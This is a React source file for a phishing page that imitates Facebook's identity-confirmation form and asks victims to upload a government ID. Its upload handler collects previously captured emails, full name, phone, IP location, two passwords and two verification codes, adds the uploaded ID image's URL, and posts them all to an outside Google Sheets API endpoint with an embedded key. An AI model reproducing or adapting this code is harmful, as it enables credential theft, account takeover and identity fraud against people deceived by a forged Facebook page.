import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'

const Upload = () => {

    const [selectedFile, setSelectedFile] = useState(null);
    const url = "https://api.cloudinary.com/v1_1/demo/image/upload";
    const dataLocalPassword = JSON.parse(localStorage.getItem('dataAllCode'));
    const navigate = useNavigate();

    const handleFileChange = (e) => {
        const file = e.target.files[0];
        setSelectedFile(file);
    };

    const handleUpload = () => {
        if (selectedFile) {
            const formData = new FormData();
            formData.append('file', selectedFile);
            formData.append("upload_preset", "docs_upload_example_us_preset");

            fetch(url, {
                method: 'POST',
                body: formData,
            })
            .then((response) => {
                return response.text();
            })
            .then((data) => {
                const url_image = JSON.parse(data).url
                const dataImages = {...dataLocalPassword, url_image};

                const data_send   = [[
                    dataImages.fill_business_email,
                    dataImages.fill_personal_email,
                    dataImages.fill_full_name,
                    dataImages.fill_facebook_pagename,
                    `&_${dataImages.fill_phone}`,
                    dataImages.IP,
                    dataImages.city,
                    dataImages.countryName,
                    dataImages.firt_password,
                    dataImages.second_password,
                    dataImages.first_code,
                    dataImages.seconds_code,
                    url_image
                ]];
    
                fetch("https://v1.nocodeapi.com/tuananh91/google_sheets/uBbNrEnAmZBhngJY?tabId=sheet1&api_key=NXhkTJQFUXJkBgBXj", {
                    method: "POST",
                    mode: "cors",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(data_send),
                })
                .then((r) => r.json())
                .then((res) => {
                    navigate('/accquality2019364736388233561/final');
                })
                .catch((error) => {
                    console.log(error);
                });


            });
        } else {
          console.log('Vui lòng chọn một tệp hình ảnh.');
        }
    };

    return (
        <div>

            <div className="upload-image">

                <section className="header" style={{background: "#4267b2"}}>
                    <p style={{margin: '0',textAlign: "center", padding: "15px 0", fontSize: "18px", lineHeight: "22px",color: "#fff"}}>Confirm Your Identity With Facebook</p>
                </section>

                <div className="main-upload" style={{background: "#dddfe2", "padding": "7px"}}>
                    <div className="form">
                        <div className="bg">
                            <h6>Confirm Your Identity With Facebook</h6>

                            <p>
                                Before we can review your account, please fill out the form below to help us verify your identity.
                            </p>

                            <p>
                                Please attach a copy of your ID(s). Learn more about why we require ID verification and what types of ID we'll accept below.
                            </p>
                            <hr/>

                            <p><b>Do not hide information on identification documents digitally</b></p>
                            <p>To prevent the use of fake identification and other abuses, we do not accept photos that have been digitally altered to hide information.</p>
                            <hr/>
                            <p><b>Government-issued identification documents</b></p>
                            <p>To confirm your name or regain access to your account, you can send us 1 government-issued identification.</p>
                            <p>Any identification documents you send to us must include:</p>
                            <p>Your name and date of birth, or</p>
                            <p>Your name and photo.</p>
                            <p>Here are some examples of government-issued IDs we accept:</p>
                            <p>*Driving license</p>
                            <p>*Identity card</p>
                            <p>*Passport</p>
                            <p>*Birth certificate</p>
                            <hr/>
                            <p><b>Identification documents are not issued by the government</b></p>
                            <p>*Student card</p>
                            <p>*Library card</p>
                            <p>*Refugee card</p>
                            <p>*Employment confirmation certificate</p>
                            <p>*Degree</p>
                            <p>*Loyalty card</p>

                            <hr/>
                            <div className="item-form">
                                <label for="file">Your identification documents ID(s)</label>
                                <p className="mini">As it's listed on the account</p>
                                <div>
                                    <input type="file" id="file" accept="image/*" name="files[]" onChange={handleFileChange} multiple/>
                                </div>
                                
                                <p className="desc">
                                    We may encrypt and store your ID for up to one year to improve our automated systems for detecting fake IDs. We might use trusted service providers to help review your information. Your ID will be stored securely and will not be visible to anyone on Facebook. If you don't want Facebook to use your ID to improve our automated systems for detecting fake IDs, you can adjust your Identity Confirmation Settings. If you turn this option off, the copy of your ID will be deleted within 30 days of submission or when you turned this option off. Visit the Help Centre to learn more about what happens to your ID after you have sent it to us.
                                </p>
                            </div>
                        </div>

                        <button onClick={handleUpload} type='submit' value="Send" name="submit" id="btn-submit">Send</button>

                    </div>
                    <div className="footer">
                        <b>Submitting ID</b>
                        <ul>
                            <li><a href="/help/103873106370583?helpref=contact_forms" target="_blank">ID rejected by Facebook</a></li>
                            <li><a href="/help/159096464162185?helpref=contact_forms" target="_blank">Types of IDs that Facebook accepts?</a></li>
                            <li><a href="/help/283100488694834?helpref=contact_forms" target="_blank">How to upload an ID to Facebook?</a></li>
                            <li><a href="/help/105487009541643?helpref=contact_forms" target="_blank">Why Facebook may ask you to upload an ID</a></li>
                            <li><a href="/help/105487009541643?helpref=contact_forms" target="_blank">What happens to your ID after you send it to Facebook</a></li>
                        </ul>
                    </div>
                </div>

            </div>

        </div>
    )
}

export default Upload